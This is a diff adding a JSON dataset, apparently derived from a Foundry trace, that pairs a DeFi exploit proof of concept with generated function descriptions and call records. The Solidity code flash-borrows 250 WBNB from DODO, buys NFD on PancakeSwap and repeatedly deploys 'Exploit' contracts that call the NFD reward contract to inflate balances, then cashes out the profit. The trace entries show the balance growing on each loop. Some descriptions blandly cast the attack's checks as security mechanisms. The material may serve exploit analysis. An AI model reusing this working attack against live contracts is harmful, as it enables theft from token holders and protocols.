@@ -1,0 +1,3537 @@
+[
+    {
+        "id": "76302120",
+        "args": "",
+        "original_code": "    function testExploit() public {\n        console.log(\"Flashloan 250 WBNB from DODO DLP...\");\n        bytes memory data = abi.encode(dodo, wbnb, 250 * 1e18);\n        DVM(dodo).flashLoan(0, 250 * 1e18, address(this), data);\n    }\n\n",
+        "description": "1. Core functions:  \nThe `testExploit` function is designed to simulate a flash loan operation. It initiates a flash loan of 250 WBNB (a type of cryptocurrency) from a specific platform called DODO DLP. The function logs a message to indicate the start of this operation and then calls the `flashLoan` function on the DODO platform to execute the loan.\n\n2. Security mechanism:  \nThe function itself does not include explicit security mechanisms like access control or input validation. However, the security relies on the underlying `flashLoan` function from the DODO platform, which typically includes checks to ensure the loan is repaid within the same transaction. The use of `abi.encode` ensures that the data passed to the `flashLoan` function is properly formatted, reducing the risk of errors.\n\n3. Parameter Function:  \n- `dodo`: Represents the address of the DODO platform where the flash loan is being requested.  \n- `wbnb`: Represents the address of the WBNB token being borrowed.  \n- `250 * 1e18`: Specifies the amount of WBNB to borrow, where `1e18` is used to convert the value to the smallest unit of the token (wei).  \n- `address(this)`: Indicates the address of the contract calling the flash loan, ensuring the loan is directed to the correct recipient.  \n- `data`: Contains encoded information about the loan details, such as the platform, token, and amount.\n\n4. Return description:  \nThe function does not return any value directly. Instead, it triggers the `flashLoan` function on the DODO platform, which handles the actual borrowing and repayment process. The success of the operation depends on the logic implemented in the `flashLoan` function and the ability of the caller to repay the loan within the same transaction.\n\nIn summary, the `testExploit` function is a simple demonstration of initiating a flash loan from the DODO platform. It logs the operation, encodes the necessary data, and calls the `flashLoan` function to execute the loan. The security relies on the DODO platform's mechanisms, and the function does not return any value but relies on the success of the external call.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "\"Flashloan 250 WBNB from DODO DLP...\"",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "76293706",
+        "args": "0, 250000000000000000000 [2.5e20], Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x000000000000000000000000d534fae679f7f02364d177e9d44f1d15963c0dd7000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c00000000000000000000000000000000000000000000000d8d726b7177a80000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "76290995",
+        "args": "0, 250000000000000000000 [2.5e20], Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x000000000000000000000000d534fae679f7f02364d177e9d44f1d15963c0dd7000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c00000000000000000000000000000000000000000000000d8d726b7177a80000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "29962",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 250000000000000000000 [2.5e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "76232111",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 250000000000000000000 [2.5e20], 0x000000000000000000000000d534fae679f7f02364d177e9d44f1d15963c0dd7000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c00000000000000000000000000000000000000000000000d8d726b7177a80000",
+        "original_code": "    function DVMFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        require(IERC20(wbnb).balanceOf(address(this)) == quoteAmount, \"Invalid WBNB amount\");\n        require(quoteAmount == 250 * 1e18, \"Invalid WBNB amount\");\n\n        console.log(\"Swap 250 WBNB to NFD...\");\n        address[] memory path = new address[](3);\n        path[0] = wbnb;\n        path[1] = usdt;\n        path[2] = nfd;\n        IERC20(wbnb).approve(address(PancakeRouter), type(uint256).max);\n        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            quoteAmount, 0, path, address(this), block.timestamp\n        );\n\n        emit log_named_decimal_uint(\"[*] NFD balance before attack\", IERC20(nfd).balanceOf(address(this)), 18);\n\n        console.log(\"Abuse the Reward Contract...\");\n        for (uint8 i; i < 50; i++) {\n            Exploit exploit = new Exploit();\n            uint256 nfdAmount = IERC20(nfd).balanceOf(address(this));\n            IERC20(nfd).transfer(address(exploit), nfdAmount);\n            exploit.abuse();\n        }\n\n        emit log_named_decimal_uint(\"[*] NFD balance after attack\", IERC20(nfd).balanceOf(address(this)), 18);\n\n        console.log(\"Swap the profit...\");\n        uint256 nfdBalance = IERC20(nfd).balanceOf(address(this));\n        path[0] = nfd;\n        path[1] = usdt;\n        path[2] = wbnb;\n        IERC20(nfd).approve(address(PancakeRouter), type(uint256).max);\n        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            nfdBalance, 0, path, address(this), block.timestamp\n        );\n\n        console.log(\"Repay the flashloan...\");\n        IERC20(wbnb).transfer(msg.sender, 250 * 1e18);\n\n        emit log_named_decimal_uint(\"Attacker's Net Profit\", IERC20(wbnb).balanceOf(address(this)), 18);\n    }\n",
+        "description": "1. **Core functions**:  \n   This function is designed to perform a series of actions involving flash loans, token swaps, and exploiting a reward contract. It starts by checking the balance of a specific token (WBNB) to ensure it matches the required amount. Then, it swaps WBNB for another token (NFD) using a decentralized exchange (PancakeSwap). After acquiring NFD, it repeatedly creates and uses an \"Exploit\" contract to manipulate a reward system for potential profit. Finally, it swaps the acquired NFD back to WBNB, repays the flash loan, and calculates the attacker's net profit.\n\n2. **Security mechanism**:  \n   The function includes two `require` statements to validate the WBNB balance and ensure the amount is exactly 250 WBNB (scaled to 18 decimal places). These checks act as safeguards to prevent incorrect or unauthorized execution. Additionally, the function uses `approve` to grant the PancakeSwap router permission to spend tokens on its behalf, ensuring smooth token swaps. However, the function lacks robust security measures against potential exploits or reentrancy attacks, which could be a vulnerability.\n\n3. **Parameter Function**:  \n   - `sender`: The address initiating the flash loan.  \n   - `baseAmount`: The amount of the base token involved in the flash loan (not directly used in this function).  \n   - `quoteAmount`: The amount of the quote token (WBNB) involved in the flash loan.  \n   - `data`: Additional data passed to the function (not used in this function).  \n   These parameters help define the context of the flash loan and ensure the function operates with the correct token amounts.\n\n4. **Return description**:  \n   The function does not explicitly return a value. Instead, it emits events (`log_named_decimal_uint`) to log the NFD balance before and after the attack, as well as the attacker's net profit in WBNB. The net profit is calculated by comparing the WBNB balance after all swaps and repayments to the initial balance.\n\n**In summary**, this function orchestrates a flash loan, token swaps, and an exploit of a reward contract to generate profit. It includes basic validation checks but lacks comprehensive security measures, making it potentially vulnerable to attacks. The function relies on external contracts and emits events to track its progress and outcomes.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "534",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "250000000000000000000 [2.5e20]"
+    },
+    {
+        "id": "0",
+        "args": "\"Swap 250 WBNB to NFD...\"",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "24420",
+        "args": "PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "231128",
+        "args": "250000000000000000000 [2.5e20], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x55d398326f99059fF775485246999027B3197955, 0x38C63A5D3f206314107A7a9FE8cBBa29D629D4F9], Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1662602962 [1.662e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "8225",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, 250000000000000000000 [2.5e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "8855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "2893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "79816744634862948831458793 [7.981e25], 285691344537148023026067 [2.856e23], 1662602962 [1.662e9]"
+    },
+    {
+        "id": "534",
+        "args": "0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE",
+        "original_code": null,
+        "description": null,
+        "return_value": "285941344537148023026067 [2.859e23]"
+    },
+    {
+        "id": "39264",
+        "args": "69609885313074755141311 [6.96e22], 0, 0x26C0623847637095655B2868C3182B2285bDAeAf, 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "12871",
+        "args": "0x26C0623847637095655B2868C3182B2285bDAeAf, 69609885313074755141311 [6.96e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "531",
+        "args": "0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE",
+        "original_code": null,
+        "description": null,
+        "return_value": "79747134749549874076317482 [7.974e25]"
+    },
+    {
+        "id": "534",
+        "args": "0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE",
+        "original_code": null,
+        "description": null,
+        "return_value": "285941344537148023026067 [2.859e23]"
+    },
+    {
+        "id": "2893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "137951665541650047066318528 [1.379e26], 1326378930534488755288383 [1.326e24], 1662602905 [1.662e9]"
+    },
+    {
+        "id": "531",
+        "args": "0x26C0623847637095655B2868C3182B2285bDAeAf",
+        "original_code": null,
+        "description": null,
+        "return_value": "1395988815847563510429694 [1.395e24]"
+    },
+    {
+        "id": "146215",
+        "args": "6862509753371461565260922 [6.862e24], 0, Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "109520",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 6862509753371461565260922 [6.862e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "0x26C0623847637095655B2868C3182B2285bDAeAf",
+        "original_code": null,
+        "description": null,
+        "return_value": "131638156568548302426278480 [1.316e26]"
+    },
+    {
+        "id": "531",
+        "args": "0x26C0623847637095655B2868C3182B2285bDAeAf",
+        "original_code": null,
+        "description": null,
+        "return_value": "1395988815847563510429694 [1.395e24]"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "6313508973101744640040048 [6.313e24]"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "6313508973101744640040048 [6.313e24]"
+    },
+    {
+        "id": "0",
+        "args": "\"Abuse the Reward Contract...\"",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "6313508973101744640040048 [6.313e24]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 6313508973101744640040048 [6.313e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "76652",
+        "args": "",
+        "original_code": "    function abuse() external {\n        rewardContract.call(abi.encode(bytes4(0x6811e3b9)));\n        uint256 bal = IERC20(nfd).balanceOf(address(this));\n        require(IERC20(nfd).transfer(msg.sender, bal), \"Transfer profit failed\");\n    }\n",
+        "description": "1. **Core functions**:  \n   The `abuse` function is designed to interact with a reward contract and transfer all the NFD tokens held by the current contract to the caller (the sender of the transaction). It first triggers a specific function in the reward contract and then checks the balance of NFD tokens in the current contract. If the balance is positive, it attempts to transfer all those tokens to the caller.\n\n2. **Security mechanism**:  \n   - The function uses `require` to ensure that the token transfer is successful. If the transfer fails, the transaction is reverted, and the error message \"Transfer profit failed\" is returned.  \n   - The function is marked as `external`, meaning it can only be called from outside the contract, not from within the contract itself.  \n\n3. **Parameter Function**:  \n   The function does not take any parameters. It relies on the `msg.sender` (the caller of the function) to determine where the NFD tokens should be sent.  \n\n4. **Return description**:  \n   The function does not return any value. Its purpose is to execute the transfer of NFD tokens to the caller. If the transfer is successful, the function completes without returning anything. If the transfer fails, the transaction is reverted, and an error message is displayed.  \n\nIn summary, the `abuse` function interacts with a reward contract, checks the NFD token balance of the current contract, and transfers all those tokens to the caller. It ensures the transfer is successful using a `require` statement and is designed to be called only from outside the contract.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "57961",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]",
+        "original_code": null,
+        "description": null,
+        "return_value": "6313508973101744640040047 [6.313e24]"
+    },
+    {
+        "id": "19644",
+        "args": "Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 525283946562065154051331 [5.252e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]",
+        "original_code": null,
+        "description": null,
+        "return_value": "6838792919663809794091378 [6.838e24]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 6838792919663809794091378 [6.838e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "6838792919663809794091378 [6.838e24]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 6838792919663809794091378 [6.838e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]",
+        "original_code": null,
+        "description": null,
+        "return_value": "6838792919663809794091377 [6.838e24]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 568987570916028974868402 [5.689e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]",
+        "original_code": null,
+        "description": null,
+        "return_value": "7407780490579838768959779 [7.407e24]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 7407780490579838768959779 [7.407e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "7407780490579838768959779 [7.407e24]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 7407780490579838768959779 [7.407e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a]",
+        "original_code": null,
+        "description": null,
+        "return_value": "7407780490579838768959778 [7.407e24]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 616327336816242585577453 [6.163e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a]",
+        "original_code": null,
+        "description": null,
+        "return_value": "8024107827396081354537231 [8.024e24]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 8024107827396081354537231 [8.024e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "8024107827396081354537231 [8.024e24]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 8024107827396081354537231 [8.024e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "8024107827396081354537230 [8.024e24]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 667605771239353968697497 [6.676e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "8691713598635435323234727 [8.691e24]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 8691713598635435323234727 [8.691e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "8691713598635435323234727 [8.691e24]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], 8691713598635435323234727 [8.691e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0xc7183455a4C133Ae270771860664b6B7ec320bB1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "8691713598635435323234726 [8.691e24]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], 723150571406468218893129 [7.231e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0xc7183455a4C133Ae270771860664b6B7ec320bB1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "9414864170041903542127855 [9.414e24]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 9414864170041903542127855 [9.414e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "9414864170041903542127855 [9.414e24]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0xa0Cb889707d426A7A386870A03bc70d1b0697598], 9414864170041903542127855 [9.414e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0xa0Cb889707d426A7A386870A03bc70d1b0697598]",
+        "original_code": null,
+        "description": null,
+        "return_value": "9414864170041903542127854 [9.414e24]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0xa0Cb889707d426A7A386870A03bc70d1b0697598], 783316698947486374705037 [7.833e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0xa0Cb889707d426A7A386870A03bc70d1b0697598]",
+        "original_code": null,
+        "description": null,
+        "return_value": "10198180868989389916832891 [1.019e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10198180868989389916832891 [1.019e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "10198180868989389916832891 [1.019e25]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211], 10198180868989389916832891 [1.019e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211]",
+        "original_code": null,
+        "description": null,
+        "return_value": "10198180868989389916832890 [1.019e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211], 848488648299917241080496 [8.484e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211]",
+        "original_code": null,
+        "description": null,
+        "return_value": "11046669517289307157913386 [1.104e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 11046669517289307157913386 [1.104e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "11046669517289307157913386 [1.104e25]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c], 11046669517289307157913386 [1.104e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c]",
+        "original_code": null,
+        "description": null,
+        "return_value": "11046669517289307157913385 [1.104e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c], 919082903838470355538393 [9.19e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c]",
+        "original_code": null,
+        "description": null,
+        "return_value": "11965752421127777513451778 [1.196e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 11965752421127777513451778 [1.196e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "11965752421127777513451778 [1.196e25]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0x03A6a84cD762D9707A21605b548aaaB891562aAb], 11965752421127777513451778 [1.196e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x03A6a84cD762D9707A21605b548aaaB891562aAb]",
+        "original_code": null,
+        "description": null,
+        "return_value": "11965752421127777513451777 [1.196e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0x03A6a84cD762D9707A21605b548aaaB891562aAb], 995550601437831089119187 [9.955e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x03A6a84cD762D9707A21605b548aaaB891562aAb]",
+        "original_code": null,
+        "description": null,
+        "return_value": "12961303022565608602570964 [1.296e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 12961303022565608602570964 [1.296e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "12961303022565608602570964 [1.296e25]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF], 12961303022565608602570964 [1.296e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF]",
+        "original_code": null,
+        "description": null,
+        "return_value": "12961303022565608602570963 [1.296e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF], 1078380411477458635733904 [1.078e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF]",
+        "original_code": null,
+        "description": null,
+        "return_value": "14039683434043067238304867 [1.403e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 14039683434043067238304867 [1.403e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "14039683434043067238304867 [1.403e25]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0x15cF58144EF33af1e14b5208015d11F9143E27b9], 14039683434043067238304867 [1.403e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
